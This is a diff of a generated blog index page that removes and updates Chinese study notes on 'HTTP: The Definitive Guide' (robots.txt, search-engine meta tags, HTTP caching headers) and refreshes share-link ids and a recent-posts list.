-<h4 id="拒绝爬虫访问"><a href="#拒绝爬虫访问" class="headerlink" title="拒绝爬虫访问"></a>拒绝爬虫访问</h4><p>每个 docroot 都有一个 robots.txt 描述爬虫访问规则文件<br><strong><em>robots 文件格式</em></strong><br>User-Agent:<br>Disallow:<br>Allow:<br><strong><em>HTML 的 robot-control 元标签</em></strong><br>&lt; meta name=”robots” content=”index,follow”&gt;<br>content: noindex, nofollow, index, follow, noarchive, all, none  </p>
-<p><strong><em>搜索引擎的 meta 标签</em></strong><br>&lt; meta name=”description” content=””&gt;<br>&lt; meta name=”keywords” content=””&gt;<br>&lt; meta name=”revisit-after” content=””&gt;</p>
-<h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><p><strong><em>全文索引</em></strong> :<br>全文索引就是一个数据库<br><strong><em>对结果排序，并提供查询结果</em></strong><br>相关性排名</p>
-
+<li>分类: 爬虫集群，协调工作
+        
+          <p class="article-more-link">
+            <a href="/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E4%B9%9D%E7%AB%A0-Web%E6%9C%BA%E5%99%A8%E4%BA%BA-%E7%AC%94%E8%AE%B0/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E4%B9%9D%E7%AB%A0-Web%E6%9C%BA%E5%99%A8%E4%BA%BA-%E7%AC%94%E8%AE%B0/" data-id="ckclu36vo0003m2rp9p8kej5w" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E4%B9%9D%E7%AB%A0-Web%E6%9C%BA%E5%99%A8%E4%BA%BA-%E7%AC%94%E8%AE%B0/" data-id="ckcr1a037000423rp73sj3x60" class="article-share-link">Share</a>
       
       
     </footer>
@@ -580,79 +527,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E9%9B%86%E6%88%90%E7%82%B9-%E7%AC%94%E8%AE%B0/" data-id="ckclu36vr0006m2rpf09q1jo0" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Http-权威指南-第七章-缓存-笔记" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%BC%93%E5%AD%98-%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time datetime="2020-06-04T01:11:13.000Z" itemprop="datePublished">2020-06-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%BC%93%E5%AD%98-%E7%AC%94%E8%AE%B0/">Http 权威指南 第七章 缓存 笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong><em>关键词</em></strong> : Modem  缓存命中  新鲜度检测  文档命中率  字节命中率<br>Modem(调制解调器，猫)<br>缓存命中(cache hit/miss)<br><strong><em>新鲜度检测</em></strong> : 缓存通过特殊请求检测内容是否最新，称为 <strong><em>Http 再验证</em></strong> (revalidation)<br>如果新鲜度检测发现对象已经被删除，则服务器返回404，缓存也会将对应副本删除<br>客户端判断响应是否来自缓存: 可以通过首部 Via、Date、Age</p>
-<p><img src="/images/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%AA%E6%96%B0%E9%B2%9C%E7%9A%84%E7%BC%93%E5%AD%98%E5%91%BD%E4%B8%AD.jpeg" alt=""></p>
-<h4 id="缓存的拓扑结构"><a href="#缓存的拓扑结构" class="headerlink" title="缓存的拓扑结构"></a>缓存的拓扑结构</h4><p><strong><em>私有缓存</em></strong> : 浏览器本地的缓存<br>本地缓存可能存在内存、本地磁盘、甚至附近的另一台计算机中<br><strong><em>共有缓存</em></strong> : 缓存代理服务器(caching proxy server)<br><strong><em>层次化(hierarchy)的代理缓存</em></strong> : 父缓存，会增加性能损耗<br><strong><em>网状缓存、内容路由以及对等缓存</em></strong> : 网状的代理缓存之间会以更加复杂的方式进行对话，做出动态的缓存通信决策</p>
-<h4 id="保持副本的新鲜"><a href="#保持副本的新鲜" class="headerlink" title="保持副本的新鲜"></a>保持副本的新鲜</h4><ul>
-<li>两种机制<ol>
-<li>文档过期(document expiration)</li>
-<li>服务器再验证(server revalidation)<br>首部 Cache-control、Expires</li>
-</ol>
-</li>
-</ul>
-<p><strong><em>用条件方法进行再验证</em></strong> :</p>
-<ul>
-<li>对缓存再验证最有用的两个 Htttp 条件首部: <ol>
-<li>If-Modified-Since: Date 再验证</li>
-<li>If-None-Match: 实体标签再验证，实体标签(ETag)可能包含文档的序列号或者版本号</li>
-</ol>
-</li>
-</ul>
-<p><strong><em>控制缓存的能力</em></strong> :</p>
-<ul>
-<li>服务器可以通过 HTTP 定义的几种方式来指定在文档过期之前可以将其缓存多长时间<br>按照优先级递减的顺序，服务器可以附加一个:<ol>
-<li>Cache-control: no-store  禁止缓存</li>
-<li>Cache-control: no-cache  缓存可以存在本地缓存区中，并且提供缓存之前必须进行新鲜度验证</li>
-<li>Cache-control: must-revalidate  通过验证只提供新鲜的副本</li>
-<li>Cache-control: max-age  处于新鲜状态的秒数</li>
-<li>Expires: Date</li>
-<li>不附加，让缓存确定自己的过期日期</li>
-</ol>
-</li>
-</ul>
-<p><strong><em>缓存和公告</em></strong> :<br>缓存有好几种方式可以告诉源服务器它们拦截了多少次命中，比如:</p>
-<ol>
-<li>每次访问都进行验证</li>
-<li>日志迁移</li>
-<li>命中技术和使用限制: 命中次数首部 Meter</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%BC%93%E5%AD%98-%E7%AC%94%E8%AE%B0/" data-id="ckclu36vi0000m2rp55mz3n8s" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/04/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E9%9B%86%E6%88%90%E7%82%B9-%E7%AC%94%E8%AE%B0/" data-id="ckcr1a039000723rp8gu34tfo" class="article-share-link">Share</a>
       
       
     </footer>
@@ -698,6 +573,10 @@
       <ul>
         
           <li>
+            <a href="/2020/07/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E7%AC%94%E8%AE%B0/">计算机网络 第七章 网络安全 笔记</a>
+          </li>
+        
+          <li>
             <a href="/2020/07/09/React-%E5%AD%A6%E4%B9%A0-%E7%AC%94%E8%AE%B0/">React 学习 笔记</a>
           </li>
         
@@ -711,10 +590,6 @@
         
           <li>
             <a href="/2020/07/01/Vue-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Vue 学习笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2020/06/28/JS-%E4%B8%AD%E7%9A%84-this/">JS 中的 this</a>
           </li>
         
       </ul>
